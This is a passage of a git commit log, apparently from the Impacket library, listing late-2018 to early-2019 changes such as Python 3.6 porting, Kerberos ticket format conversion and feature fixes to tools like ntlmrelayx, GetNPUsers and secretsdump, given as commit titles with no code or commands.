    Return SMB2/3 signing information the same way SMB1 does.
    
    Fixes https://github.com/byt3bl33d3r/CrackMapExec/pull/300

commit 50ccbf9fb7b12cb31a260db321bd8e70ab408c50
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Tue Mar 19 11:54:37 2019 +0100

    added usage

commit 723f634c15e9c7bfbb3d4d7489a0fdfa30a1b09b
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Tue Mar 19 11:38:13 2019 +0100

    included into ccache save kirbi file

commit f531fd7b53cd793e0ab103fbcf0e7c169667a089
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Tue Mar 19 11:24:00 2019 +0100

    included into ccache load from kirbi file

commit 5a17a2b6639a1e27d80bb21b97abf06a75deae5e
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Tue Mar 19 10:53:13 2019 +0100

    added ccache to kirbi functionality

commit e4e29fb675dafe9aa25d2a619f955b0904b54a19
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Mon Mar 18 07:59:29 2019 +0100

    added kirbi to ccache functionality

commit fcf8c53b887c36f948856cbcab213f2b23aa476e
Merge: c97c69f1 37cee525
Author: asolino <bethus@gmail.com>
Date:   Sat Mar 16 09:18:04 2019 -0300

    Merge branch 'master' into python36

commit 37cee525eb265c82032f8b5e17334a9c2d9f1700
Merge: a400ca15 9d2bfcb3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sat Mar 16 09:13:13 2019 -0300

    Merge pull request #590 from Zer1t0/mod_GetNPUsers
    
    added hashcat/john format and users file input to GetNPUsers.py

commit 9d2bfcb3d99532b7de7ef8b4327c8a0c19220555
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Sat Mar 16 11:37:21 2019 +0100

    added usersfile option

commit 8651f50f416bb6f3398b652aad2ba7c0e6e9022f
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Sat Mar 16 11:02:25 2019 +0100

    added john/hashcat format option

commit c97c69f1a55a34ce904a57cf7633be922c0dbf71
Merge: cafda7be a400ca15
Author: asolino <bethus@gmail.com>
Date:   Wed Mar 13 20:55:27 2019 -0300

    Merge branch 'master' into python36

commit a400ca15946c6c1f4d7a9dfc852032510b75816d
Merge: f254380c 2cf24ed6
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Mar 13 20:49:34 2019 -0300

    Merge pull request #584 from Fist0urs/krb5tgs_1718
    
    Fix incorrect checkum regarding aes-encrypted TGS tickets

commit cafda7be22d96d710007a6ae0aad400dd620410b
Merge: 680624b9 f254380c
Author: asolino <bethus@gmail.com>
Date:   Mon Mar 11 11:18:20 2019 -0300

    Merge branch 'master' into python36

commit f254380ca6ebd356ade0edf53d54fdf3bc1edc0c
Merge: ade9b6fb f2f5fadd
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 11 09:50:46 2019 -0300

    Merge pull request #575 from Petraea/master
    
    Alter requirements for Windows

commit 2cf24ed6a006b2371e539a35e240c764b980e10c
Author: Fist0urs <jean-christophe.delaunay@synacktiv.com>
Date:   Sun Mar 10 12:59:12 2019 +0100

    Fix incorrect checksum within aes128-aes256 + format output for john/hashcat accordingly

commit ade9b6fb7c35deb6302765bd478925ffb6082c2f
Merge: 89165ef1 2c0ecaf2
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sat Mar 9 22:11:30 2019 -0300

    Merge pull request #583 from SR4ven/issue-582
    
    Temporary fix for #582

commit 2c0ecaf2a31fdbc86e44e21a4167e83fb2f20d93
Author: SR4ven <46794237+SR4ven@users.noreply.github.com>
Date:   Sat Mar 9 19:40:03 2019 +0100

    Temporary fix for #582

commit 680624b9275f0344b79922602958567244c11071
Merge: 4668318e 89165ef1
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 5 10:34:35 2019 -0300

    Merge branch 'master' into python36

commit 89165ef1c06be701c32826de173ceb57e101372a
Merge: 4fdbbcc4 64500b92
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Mar 5 10:33:49 2019 -0300

    Merge pull request #579 from dirkjanm/rbdelrelay
    
    Add Resource Based Delegation features to ntlmrelayx

commit 64500b92a38ef0423af7c5c7ed90567b1eadb074
Author: Dirk-jan Mollema <dirkjan@dirkjanm.io>
Date:   Mon Mar 4 19:40:53 2019 +0100

    py3 compatibility

commit 381ee348dbc531857a0e1c186db88930056c184d
Author: Dirk-jan Mollema <dirkjan@dirkjanm.io>
Date:   Mon Mar 4 19:25:20 2019 +0100

    RB Delegation abuse for ntlmrelayx LDAP attack

commit 4668318e3da3e66a77332e6944099e6d915d3f77
Merge: b2455441 4fdbbcc4
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 27 14:41:23 2019 -0300

    Merge branch 'master' into python36

commit 4fdbbcc4a9e0bdf49a82d72dd7d220ac8c8574a8
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 27 14:10:25 2019 -0300

    Avoid crashing if NT Hash cannot be retrieved for an specific row

commit b2455441fc3749d0b0080679d0636443327d2957
Merge: d9b46251 247ded77
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 11 09:58:36 2019 -0300

    Merge branch 'master' into python36

commit 247ded77946fd74c8ac2393798564d9f547ee4cf
Merge: 82a8a97b 3a4acd34
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 11 09:55:56 2019 -0300

    Merge pull request #576 from fox-it/ldapattack-improve
    
    ntlmrelayx ldapattack improvements

commit 3a4acd341f9a3374065b8d97e3ec23df39dc7cff
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sun Feb 10 13:34:20 2019 +0100

    Added ACL restore options to ntlmrelayx ldap attack

commit f4f1c27a83821c5cefd71b1980c855e3dbae030d
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri Feb 8 12:50:09 2019 +0100

    Fixed security descriptor parsing in ntlmrelayx ldap attack

commit f2f5faddc7c6c7c63d043f52994d31764e95796f
Author: Petraea <Petraea@users.noreply.github.com>
Date:   Fri Feb 8 12:45:17 2019 +0100

    Alter requirements for Windows

commit d9b462513745b08fdb63e025dc103e4fac6c0829
Merge: f284e9db 82a8a97b
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 6 19:30:49 2019 -0300

    Merge branch 'master' into python36

commit 82a8a97b170c2f75a7efaab232780b6abc27302a
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 6 19:30:31 2019 -0300

    Updating

commit 0a56ff11f1c88dea1ca2819e45237cf6eddfbc1c
Merge: 812972ee 02127479
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 31 10:56:22 2019 -0300

    Merge branch 'muizzk-master'

commit 02127479fc06b3bb2c86d4b1a8ca5d15f9ee6bb1
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 31 10:55:31 2019 -0300

    Moving flake8 install to travis so we don't impacket users to install it (not necessary)

commit 5c379390e94380fde2fd18134a1eb283e4d2f632
Author: Muizudeen Kusimo <muizudeen@travis-ci.org>
Date:   Wed Jan 30 15:51:19 2019 -0800

    Pin flake8 version & remove from travis config

commit f284e9dba960b05703d283768cec99a867d17c3e
Merge: a63e784a 812972ee
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 30 18:30:37 2019 -0300

    Merge branch 'master' into python36

commit 812972eef48160bf2c38e4e4e59877b9779f3f5a
Merge: b64f8e35 2e918baa
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jan 30 18:26:31 2019 -0300

    Merge pull request #568 from martingalloar/ldapattack-validateprivs
    
    ntlmrelayx: added option to avoid privileges enumeration on LDAP attack

commit b64f8e35dd3f02c83804dec97cdd5a13816e49e5
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 30 18:19:06 2019 -0300

    We're now in 2019 :)

commit 2e918baa63cf8524b134def24687c6cc251ac5e7
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jan 30 17:24:38 2019 -0300

    Added log note

commit 7cf76787b7b8d22157355485715fe7235442fd75
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jan 30 17:12:41 2019 -0300

    ntlmrelayx: added option to avoid privileges enumeration
    
    As this might be noise and slow on certain Domains, it might be handy to have an option to explicitely avoid validating user's privileges and assume the user have it. Note that this only leaves escalating to a user via ACL attacks, as the other methods requires determining the proper containers.

commit a63e784ac0381927c004307be2861a34f627bd33
Merge: b96bedc8 cef2cb8f
Author: asolino <bethus@gmail.com>
Date:   Sun Jan 27 12:58:44 2019 -0300

    Merge branch 'master' into python36

commit cef2cb8fc0ba1b826f8b50a2ed14b6827834070f
Merge: 66cdd998 328c2d1f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Jan 27 07:58:19 2019 -0800

    Merge pull request #564 from fox-it/krbfixes
    
    Small fixes

commit 328c2d1f3981acc9ac069589d1d8ed1d3a6f04b5
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Jan 26 14:11:13 2019 +0100

    fix wrong security descriptor flag constant

commit 0404dc6808972e11e47bf9c18aabc11ec48013dc
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Jan 26 14:00:34 2019 +0100

    use custom KDC in S4U

commit 66cdd998549b49644b00dcb2806d2cdcde128285
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 26 02:49:50 2019 -0300

    Chaning order when filling out the activeRelays list
    
    * Just to avoid some concurrency problems

commit b96bedc8bd13d36554edd27cfee42a3be084cfb2
Merge: 3c6f1d3b 82729d3a
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 26 01:32:28 2019 -0300

    Merge branch 'master' into python36

commit 82729d3ab046846380ef2589cc675791f46e18f2
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 26 01:29:33 2019 -0300

    Getting rid of SMBRelay connectionData dict.
    
    * In theory we can get by with the connId (the thread number) connection data.
    * If theory fails this might break things badly, testing needed.

commit 6648b4002a632b5e87dfaf6071bd4883774afa96
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 25 19:40:17 2019 -0800

    We're now logging the target and also the username
    
    * Regardless of it being soecified as a target.

commit 211e9c89aff0560a076278eaf5ea0309598974cd
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 25 19:02:15 2019 -0800

    If relay was successful we should tell the TargetProcessor that.
    
    * And add the target to the finishedAttacks if applicable

commit 3c6f1d3b4b30f9de605a677433ae3367cd88c449
Merge: 67575cd0 e657345c
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 24 14:49:39 2019 -0800

    Merge branch 'master' into python36

commit e657345c3390921d24cbebd11b4c89b3499189ad
Merge: bbce4d32 ecc05af6
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 24 14:46:02 2019 -0800

    Merge branch 'eladshamir-patch-1'

commit ecc05af6632e02236780198685a099a0b9b78352
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 24 14:44:50 2019 -0800

    Adding structure and constants for resource-based constrained delegation
    
    * So we can replace the raw binary data

commit 67575cd020691c91f10e4c45f4d98de11c6649b3
Merge: 8a511a2a bbce4d32
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 24 13:30:00 2019 -0800

    Merge branch 'master' into python36

commit bbce4d3200e63772fce87274c17097db9f5de157
Merge: 0e33a702 800ee48c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Jan 24 13:29:33 2019 -0800

    Merge pull request #562 from Zer1t0/relayservers_ports
    
    Relayservers ports

commit 800ee48cde555447bebdd454ed83c5c9de36a6b9
Author: Zer1t0 <Zer1t0@test.virtual>
Date:   Thu Jan 24 17:00:07 2019 +0100

    added option to listening in custom port

commit 09b1a866cb7ace3a5d1b92f90e3a39e76e9ffedf
Author: root <root@debmin.test.virtual>
Date:   Thu Jan 24 16:25:35 2019 +0100

    added parameter to not launch SMB or HTTP server

commit bb17d8450eaa8a6ebaedc7f67e6a4d1f97d588c7
Author: Elad Shamir <8843083+eladshamir@users.noreply.github.com>
Date:   Sat Jan 19 03:22:39 2019 +1100

    Adding resource-based constrained delegation support to S4U

commit 8a511a2ac0fe5769b15f5cc65d292e9e34e43d8c
Merge: 104b3e28 0e33a702
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 16 10:18:45 2019 -0300

    Merge branch 'master' into python36

commit 0e33a702165aa35d035503830fc302343eee020a
Merge: be27ab94 94eaf5fc
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jan 16 10:18:00 2019 -0300

    Merge pull request #556 from franferrax/master
    
    Minor change in secretsdump.py: New LSA_KERBEROS secret type for __perSecretCallback()

commit be27ab948f71d34378d51dc3fcbd3ca16bdc39a1
Merge: 2b708a9a f859ceb3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jan 16 10:13:13 2019 -0300

    Merge pull request #557 from CaledoniaProject/master
    
    Use ^D to exit shell

commit f859ceb3d8356b8e7a13af2f6a2056d31c497a49
Author: Aaron Lewis <the.warl0ck.1989@gmail.com>
Date:   Wed Jan 16 19:22:45 2019 +0800

    Use ^D to exit shell

commit 94eaf5fc1fb3ae1dc2458d6a50a62a155f55fe27
Author: fferrari <fferrari@coresecurity.com>
Date:   Tue Jan 15 18:04:39 2019 -0300

    New LSA_KERBEROS secret type for __perSecretCallback()
    With #512 implementation, Kerberos keys are now dumped along with the LSA secrets, so we added the new LSASecrets.SECRET_TYPE.LSA_KERBEROS to notify the secret's type while executing the configured secrets callback (analogous to NTDSHashes.SECRET_TYPE.NTDS_KERBEROS)

commit 104b3e287d974177c550529d6e6fdd3adc896ca9
Merge: 11a6921d 2b708a9a
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 14 10:02:29 2019 -0300

    Merge branch 'master' into python36

commit 2b708a9ae222c49163b846290ea5e8af07342f02
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 14 10:01:44 2019 -0300

    Handling Ctrl-D to exit MiniShell.
    
    - Fixes https://github.com/SecureAuthCorp/impacket/issues/555

commit 11a6921da8b6a4cba7af33929f9660efee7ab2f5
Merge: 906a8cc5 11f4e014
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 11 15:53:13 2019 -0300

    Merge branch 'master' into python36

commit 11f4e014d60745b875eba2a091a29e90409c3971
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 11 15:49:52 2019 -0300

    Adding isAdmin() to ProtocolClient plugin
    
    Should return whether or not the user is admin in the form of a string (e.g. "TRUE", "FALSE")
    Depending on the protocol, different techniques should be used.
    By default, raise exception
    
    For now, only implemented for the SMBRelayClient (should be easy to do for MSSQL).
    
    Improvements over what was committed in https://github.com/SecureAuthCorp/impacket/pull/548 since it now also covers connections comming from the HTTP Server (besides now belonging to the plugins).
    
    Testing needed

commit 906a8cc59f9cb2548b2357fd4ce1df61bf51b1cf
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 8 19:29:45 2019 -0300

    Making https://github.com/SecureAuthCorp/impacket/pull/552 Python3 friendly

commit 306348dd6307c9c7db79655a737f15084875ccf4
Merge: 775acb7b 196fabc7
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 8 19:21:42 2019 -0300

    Merge branch 'master' into python36

commit 196fabc766ffdb20e06a23e0c2092492801b879f
Merge: 8f19671d 45a13e5f
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 8 19:19:14 2019 -0300

    Merge branch 'Qwokka-master'

commit 45a13e5ff39febcefeefb70c323756a844bfe7e5
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 8 19:18:06 2019 -0300

    Adding support for relative and non-relative paths
    
    - For https://github.com/SecureAuthCorp/impacket/pull/552

commit c7cce5a1b0fb0ee6f74324d352218ba9791e4fcd
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 8 19:16:22 2019 -0300

    We gracefully fail if we're under SMB1
    
    - For https://github.com/SecureAuthCorp/impacket/pull/552

commit 91e712ad040f285edd28579fe934be0057ca86a8
Merge: 8f19671d 33b095c8
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 21:36:11 2019 -0300

    Merge branch 'master' of https://github.com/Qwokka/impacket into Qwokka-master

commit 775acb7be5baa4e59dfc33e229c69b9cd14b4753
Merge: c3a779d7 8f19671d
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 21:02:48 2019 -0300

    Merge branch 'master' into python36

commit 8f19671d74e454ec34a392b95d23b9204d42c436
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 21:00:48 2019 -0300

    Only check for remote admin privilege when target protocol is SMB
    
    - Bug added when merging https://github.com/SecureAuthCorp/impacket/pull/548
    - Interesting ToDo written there to make this in a much better/modular way (PRs welcomed)

commit 33b095c80385bb33673313b33f42125596598aa3
Author: Jack Baker <jackchrisbaker@gmail.com>
Date:   Mon Jan 7 13:29:43 2019 -0800

    Add "mount" and "umount" commands to add/remove mount points

commit 68eb9a63f84eb3b5c3ef2213ed1bf8575ba6b98b
Author: Jack Baker <jackchrisbaker@gmail.com>
Date:   Mon Jan 7 13:29:12 2019 -0800

    Add reparse point structures

commit fd8c434dcc84e31984b73ffa35f3e33ef9a95ba2
Author: Jack Baker <jackchrisbaker@gmail.com>
Date:   Mon Jan 7 13:28:45 2019 -0800

    Add createMountPoint and removeMountPoint functions

commit c3a779d7c3a38398a7ba3c4d32052e3526768d62
Merge: 86a4556e 899e1545
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 17:41:57 2019 -0300

    Merge branch 'master' into python36

commit 899e15453d7f46df65eb285339212bb742103457
Merge: e49e558d e18eb49a
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 17:40:20 2019 -0300

    Merge branch 'imaibou-socks_local_admin_check'

commit e18eb49a45ef6fada710d437352df68b904f44cb
Merge: e49e558d 50926cca
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 17:37:42 2019 -0300

    Merge branch 'socks_local_admin_check' of https://github.com/imaibou/impacket into imaibou-socks_local_admin_check

commit e49e558de3a4a91bf02843e5ae4a0e13c0333106
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 17:36:05 2019 -0300

    Be sure we're not using UNICODE during session setup relay
    
    - Bug manifested in ntlmrelayx after commit https://github.com/SecureAuthCorp/impacket/commit/b3e202869150c6562a2454d4f1707553bfd2f3d6

commit 86a4556ed9bcb7ed40da2e70338137c9a41153e8
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 16:53:01 2019 -0300

    Python versions supported and minimal changes to README

commit c32c43cf83476869e34676ad026228da546a3896
Merge: edc890d0 8e3864bd
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 13:06:00 2019 -0300

    Merge branch 'master' into python36

commit 8e3864bdb69b25f7b5d318aecc6dd71a47cacb84
Merge: 8c2ab38a 1afad92a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 7 13:03:38 2019 -0300

    Merge pull request #549 from MrAnde7son/patch-9
    
    Added IDL_DRSUnbind

commit edc890d054120bf0c4925877e6ffcf2601173e68
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 12:47:07 2019 -0300

    Fixing a merge error
    
    - Forgot to import NTLMSSP_NEGOTIATE_SIGN

commit 603dd98b1f181b0fc318a7690721a095bbd5f964
Merge: 0b620ff4 8c2ab38a
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 12:41:42 2019 -0300

    Merge branch 'master' into python36

commit 8c2ab38afbdbba90785de53d6c22bfeb6615260b
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 12:38:10 2019 -0300

    When adding a share internally, always convert to upper case
    
    - Might address a side effect reported under https://github.com/SecureAuthCorp/impacket/issues/545

commit 1afad92a6c8bed001c0e270ed7157f57bc7afe40
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Dec 26 15:11:52 2018 +0200

    Update drsuapi.py

commit c3176c5cca2612e8b32c6f9aa411ed1e09c8d2ca
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Dec 26 15:10:03 2018 +0200

    Added IDL_DRSUnbind
    
    Hi,
    
    I added IDL_DRSUnbind method to destroy a context handle previously created by the IDL_DRSBind method.
    
    Thanks.

commit 0b620ff43c6e58112f7dc85f88b399de5801a293
Merge: 1e0214cd 16c56213
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 21 19:06:16 2018 -0300

    Merge branch 'master' into python36

commit 16c562138dac02b1bb76a9e18938fa3ca5c3f290
Merge: b3e20286 5f5d3ea2
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Dec 21 19:05:18 2018 -0300

    Merge pull request #547 from fox-it/signingwarning
    
    Made ldap->smb relaying incompatibility more clear in ntlmrelayx

commit 50926ccab63b050bdf97e1f5a25c982515face29
Author: ibo <imed.bounab@provadys.com>
Date:   Fri Dec 21 15:25:59 2018 +0100

    Adding check for local admin access for SMB relayed socks

commit c658e51cb6ab34b5e6f0bf4251845133e9940954
Author: ibo <imed.bounab@provadys.com>
Date:   Fri Dec 21 15:22:36 2018 +0100

    Revert "added GetInterestingFiles.py example script"
    
    This reverts commit febc5dae85009a0f113a9cbf0e9ebbcdcee3e322.

commit 6ff75c51252e55eaf575707920e500a3e254498c
Author: ibo <imed.bounab@provadys.com>
Date:   Fri Dec 21 15:17:16 2018 +0100

    Revert "Adding check for local admin access for SMB relayed socks"
    
    This reverts commit 19c180c7e44b428c1326523c533ff2d4901a9839.

commit 19c180c7e44b428c1326523c533ff2d4901a9839
Author: ibo <imed.bounab@provadys.com>
Date:   Fri Dec 21 15:09:23 2018 +0100

    Adding check for local admin access for SMB relayed socks

commit 5f5d3ea25509e96e51c6afb12fbf3bcc7335b1df
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri Dec 21 12:27:41 2018 +0100

    Made ldap->smb relaying incompatibility more clear in ntlmrelayx

commit 1e0214cd868270082f4a613a157edf3116437c13
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 19 12:03:44 2018 -0300

    Decoding 'latin-1' instead of 'ascii' in case there are chars > 128
    
    - Should fix https://github.com/SecureAuthCorp/impacket/issues/535

commit dff713dbccdb4d88fd7e55692284a68a6b118750
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 17 12:31:29 2018 -0300

    checking DEBUG level at the logging.getLogger() instance
    
    - Trying to nail down https://github.com/SecureAuthCorp/impacket/issues/535

commit 9a77aa52312378bd8dc67bc51319164ec4202428
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 16 19:29:37 2018 -0300

    Adding more debug data when UnicodeDecodeError is triggered
    
    - Might help understanding https://github.com/SecureAuthCorp/impacket/issues/535

commit ae271633e4527f59a236feccfff43c08a8a676e3
Merge: 76af6c97 b3e20286
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 15 10:56:11 2018 -0300

    Merge branch 'master' into python36

commit b3e202869150c6562a2454d4f1707553bfd2f3d6
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 15 10:53:17 2018 -0300

    If target supports Unicode, we will talk Unicode

commit 76af6c972b67c88012f722e079d3ed0e1200f2cc
Merge: 09744feb 6726b312
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 15 10:32:36 2018 -0300

    Merge branch 'master' into python36

commit 6726b312b116fbe71c927c698f13c86530af14ab
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 15 10:32:11 2018 -0300

    Should bitwise AND to verify the flag is present

commit 09744feb6fdb52a55cf2b4b858330f0e24491205
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 15 10:14:13 2018 -0300

    We either decode utf-16le or ascii, returning a str

commit 8e8485424d691b94a6c055239ac5c3e45bf92234
Merge: 9c7780b3 f99aaf93
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 14 22:54:59 2018 -0300

    Merge branch 'master' into python36

commit f99aaf93d02b9da5f1219e083f82f4c722b0ace7
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 14 22:52:02 2018 -0300

    Sending received packet flags to findFirst2 and queryFsInformation
    
    - A better way to determine how to encode the answers
    - Not sure if this addresses https://github.com/SecureAuthCorp/impacket/issues/545

commit 9c7780b31b1dff5a904d6ec96037c63c97257e72
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 14 22:37:04 2018 -0300

    Catching TypeError as well

commit b1d959c41eae944a8aa3628e63ed2f7e1ef5abfa
Merge: b2f5337b 64caff11
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 11 14:03:49 2018 -0300

    Merge branch 'master' into python36

commit 64caff119c85031349bb14b1ea397b14e06efb03
Merge: 0c67b6e9 397e0afe
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 11 14:02:37 2018 -0300

    Merge branch 'MrAnde7son-patch-8'

commit 397e0afe8aaa92b21d28947300a69bd3055d035b
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 11 14:01:42 2018 -0300

    Updated test cases for even.py
    
    - It does require package six, not a requirement currently in master (it will be soon onece we merge the Python36 branch)

commit 5d7434cb48ffa622f26c7a05889073b421feeda2
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Tue Dec 11 17:05:41 2018 +0200

    Update even.py

commit ee0e1aa9a871a76ec504b3e47833070387017709
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Mon Dec 10 16:40:47 2018 +0200

    Added MS-EVEN interface Implementation
    
    Hi mate,
    I noticed there is a test case exists for MS-EVEN, but the actual interface implementation is missing. Therefore, here's an implementation of most functions.
    One thing I couldn't figure out is the definition of ElfrReportEventW.  "Strings" parameter should be an array of unicode strings set to size "NumStrings" parameter. If you could have a look and help me define it correctly.
    Thanks!

commit b2f5337b559a79c379aeba7625cf68c5462bd236
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 10 10:14:16 2018 -0300

    Calling coverage through python

commit a43e434214ece7e8c343a33820d8c43b0a3262a4
Merge: f34153fa 0041cddd
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Dec 7 13:37:14 2018 -0300

    Merge pull request #540 from infinnovation-dev/main2unit36
    
    Convert __main__ tests into unit tests (bis)

commit f34153fac9495a30cf70b18ba5dbb00ae1c2cfab
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 7 13:27:37 2018 -0300

    Keeping backwards compatibility and returning str() when processing name/qname

commit 0041cddd970859f9290716e56727799134abda48
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Thu Dec 6 21:54:09 2018 +0000

    tests/misc: Make runalltestcases.sh report error if test(s) fail
    
    Fix #539 for this subdirectory only

commit 0bdf9bde196ea7c12866b6f93aae98f4fbec185a
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Thu Dec 6 21:09:45 2018 +0000

    tests/misc: Python2/3 fixes in test_krb5_crypto & test_dcerpc_v5_ndr

commit fd051b9f7566de5f677445c0c5bf04b0b9b7e3bb
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Wed Dec 5 21:29:20 2018 +0000

    Remove informal tests from __main__ sections
    
    These have been converted to unit tests

commit 30f9f93f01bc60b62dc554bf622fb0853e9ae274
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Wed Dec 5 20:46:34 2018 +0000

    tests: Run misc tests instead of __main__ in related modules

commit 50d5826c7eeceef284e05abb5b74a6596a60aa90
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Wed Dec 5 20:30:13 2018 +0000

    tests: Add misc/test_dcerpc_v5_ndr

commit 45427f72dd98119b9752fa3dde703cf1dbc3e148
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Tue Dec 4 22:00:48 2018 +0000

    tests: Add misc/test_dns

commit 2258b10f4fe7136d32d29cfba4dfdb460491f74d
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Tue Dec 4 22:00:26 2018 +0000

    tests: Add misc/test_ip6_address

commit f09b9a69be40b59aa753a49823c0649213c54f82
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Tue Dec 4 19:43:23 2018 +0000

    tests: Add misc/test_krb5_crypto

commit b4ba401c90920a07e1a40bd413beca56ef9218f9
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Tue Dec 4 18:48:26 2018 +0000

    tests: Add misc/test_structure

commit 579138ff3f8d9f85fe994202d2297a912142d393
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Mon Dec 3 22:56:23 2018 +0000

    tests: Add misc/test_crypto

commit 5e66258038fc17f79e434df80893087ef5e1778d
Merge: e072ef9c 0c67b6e9
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 6 11:33:32 2018 -0300

    Merge branch 'master' into python36

commit e072ef9ce593b149bcecf151ba475af7c1dbe6f1
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 6 11:33:19 2018 -0300

    Adding Python 3.6 support

commit 0c67b6e9776f5bca0cfe7fd057539f1fc09e2365
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 16:10:08 2018 -0300

    And back to dev version :)

commit 462449c1bc774d725b38f31d4fa32ec7dfaac22e
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 15:09:01 2018 -0300

    About to release

commit 1c21a460ae1f8d20e7c35c2d4b123800472feeb3
Merge: 553881b9 16748f5a
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 14:41:11 2018 -0300

    Merge branch 'master' into python36

commit 16748f5a7a1e7a40be7d745ba22aa983414df9d1
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 14:39:09 2018 -0300

    Fixing wrong test cases location in DCERPC modules's header

commit 1ad2683592bc6c7b7dc46e193e56b41b3f7dda40
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 14:34:58 2018 -0300

    Changing Copyright notice

commit 553881b9da7ee18846782fc6697559c10e655233
Merge: 7589c6af c328de82
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 12:16:54 2018 -0300

    Merge branch 'master' into python36

commit c328de825265df12ced44d14b36c688cd9973f5c
